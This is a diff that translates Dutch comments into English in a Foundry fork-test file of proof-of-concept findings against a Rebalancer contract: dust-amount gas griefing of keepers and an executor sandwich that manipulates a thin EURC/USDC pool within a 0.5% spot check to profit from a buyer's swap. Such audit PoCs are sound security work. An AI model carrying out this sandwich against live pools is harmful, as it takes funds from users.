@@ -38,10 +38,10 @@ contract PocFork is Test {
         vm.stopPrank();
     }
 
-    /// B: stof-owner met amountIn = 1 basiseenheid EURC: altijd due, altijd revert op Uniswap.
+    /// B: dust owner with amountIn = 1 base unit EURC: always due, always reverts on Uniswap.
     function test_poc_dustOwnerAlwaysDueAlwaysReverts() public {
         address dust = makeAddr("dust");
-        _fund(dust, 10, 0); // 0,00001 EURC
+        _fund(dust, 10, 0); // 0.00001 EURC
         vm.prank(dust);
         r.setParams(Rebalancer.Params({active: true, targetBps: 8000, bandBps: 1, maxCorrectionBps: 1, minTradeEurc: 1, interval: 1 hours, maxSlippageBps: 100}));
         (bool due, int256 delta) = r.isDue(dust);
@@ -52,13 +52,13 @@ contract PocFork is Test {
         uint256 g = gasleft();
         vm.expectRevert();
         r.execute(dust, keeper);
-        console.log("gas van de mislukte execute:", g - gasleft());
+        console.log("gas of the failed execute:", g - gasleft());
         assertEq(r.lastExecutedAt(dust), 0);
         (due,) = r.isDue(dust);
-        assertTrue(due, "blijft due na revert");
+        assertTrue(due, "stays due after revert");
     }
 
-    /// B2: welk stof-bedrag slaagt wel (kost dus 400k gas van de wekker voor een fee van 0)?
+    /// B2: which dust amount does succeed (so costs the keeper 400k gas for a fee of 0)?
     function test_poc_dustRunSucceedsWithZeroFee() public {
         address dust = makeAddr("dust2");
         _fund(dust, 1e6, 0); // 1 EURC
@@ -66,18 +66,18 @@ contract PocFork is Test {
         r.setParams(Rebalancer.Params({active: true, targetBps: 8000, bandBps: 1, maxCorrectionBps: 1, minTradeEurc: 1, interval: 1 hours, maxSlippageBps: 100}));
         (bool due, int256 delta) = r.isDue(dust);
         assertTrue(due);
-        console.log("amountIn (basiseenheden EURC):", uint256(delta)); // 100 = 0,0001 EURC
+        console.log("amountIn (EURC base units):", uint256(delta)); // 100 = 0.0001 EURC
         uint256 g = gasleft();
         r.execute(dust, keeper);
-        console.log("gas van de geslaagde stof-run:", g - gasleft());
-        console.log("fee naar keeper:", EURC.balanceOf(keeper), "naar treasury:", EURC.balanceOf(treasury));
+        console.log("gas of the successful dust run:", g - gasleft());
+        console.log("fee to keeper:", EURC.balanceOf(keeper), "to treasury:", EURC.balanceOf(treasury));
         assertEq(EURC.balanceOf(keeper), 0);
     }
 
-    /// C: de aanroeper sandwicht zijn eigen execute binnen de 0,5%-spotcheck.
-    ///    Buyer: 20.000 EURC, cap 10% -> run van 2.000 EURC. Aanvaller verkoopt eerst EURC in de dunne
-    ///    EURC/USDC-pool (EURC wordt goedkoper, spot cbBTC-in-EURC stijgt), laat de run lopen (die koopt
-    ///    op een slechtere koers), en koopt de EURC daarna terug.
+    /// C: the caller sandwiches his own execute within the 0.5% spot check.
+    ///    Buyer: 20,000 EURC, cap 10% -> run of 2,000 EURC. Attacker first sells EURC into the thin
+    ///    EURC/USDC pool (EURC gets cheaper, spot cbBTC-in-EURC rises), lets the run go (which buys
+    ///    at a worse price), and then buys the EURC back.
     function test_poc_executorSandwich() public {
         address buyer = makeAddr("buyer");
         deal(address(EURC), buyer, 20_000e6);
@@ -90,7 +90,7 @@ contract PocFork is Test {
         console.log("oracle:", oracle, "spot:", r.spot());
         console.log("EURC in pool:", EURC.balanceOf(POOL_EURC_USDC) / 1e6, "USDC in pool:", USDC.balanceOf(POOL_EURC_USDC) / 1e6);
 
-        // Zoek het grootste EURC-bedrag waarmee de spot nog binnen 0,5% blijft (bisectie op een snapshot).
+        // Find the largest EURC amount at which the spot stays within 0.5% (bisection on a snapshot).
         uint256 lo = 0; uint256 hi = 30_000e6;
         for (uint256 i = 0; i < 20; i++) {
             uint256 mid = (lo + hi) / 2;
@@ -101,22 +101,22 @@ contract PocFork is Test {
             vm.revertToState(snap);
             if (ok) lo = mid; else hi = mid;
         }
-        console.log("max EURC-verkoop binnen 0,5%:", lo / 1e6);
+        console.log("max EURC sell within 0.5%:", lo / 1e6);
 
-        // 1) Aanvaller verkoopt `lo` EURC -> USDC.
+        // 1) Attacker sells `lo` EURC -> USDC.
         uint256 usdcGot = _sellEurc(atk, lo);
-        console.log("spot na push:", r.spot(), "afwijking bps:", (r.spot() - oracle) * 10_000 / oracle);
-        // 2) execute(buyer) -> buyer koopt cbBTC voor 10.000 EURC.
+        console.log("spot after push:", r.spot(), "deviation bps:", (r.spot() - oracle) * 10_000 / oracle);
+        // 2) execute(buyer) -> buyer buys cbBTC for 10,000 EURC.
         uint256 btcBefore = CBBTC.balanceOf(buyer);
         r.execute(buyer, atk);
         uint256 btcGot = CBBTC.balanceOf(buyer) - btcBefore;
         uint256 fairBtc = 1_995e6 * 1e8 / oracle;
-        console.log("buyer kreeg sats:", btcGot, "eerlijk (oracle, na fee):", fairBtc);
-        console.log("buyer-verlies t.o.v. oracle in bps:", (fairBtc - btcGot) * 10_000 / fairBtc);
-        // 3) Aanvaller koopt EURC terug met alle USDC.
+        console.log("buyer got sats:", btcGot, "fair (oracle, after fee):", fairBtc);
+        console.log("buyer loss vs oracle in bps:", (fairBtc - btcGot) * 10_000 / fairBtc);
+        // 3) Attacker buys EURC back with all USDC.
         uint256 eurcBack = _buyEurc(atk, usdcGot);
         int256 profit = int256(eurcBack) - int256(lo) + int256(EURC.balanceOf(atk) - eurcBack); // + reward
-        console.log("aanvaller EURC-winst (incl. 0,05 reward), basiseenheden:", profit);
+        console.log("attacker EURC profit (incl. 0.05 reward), base units:", profit);
     }
 
     function _sellEurc(address who, uint256 amt) internal returns (uint256 out) {
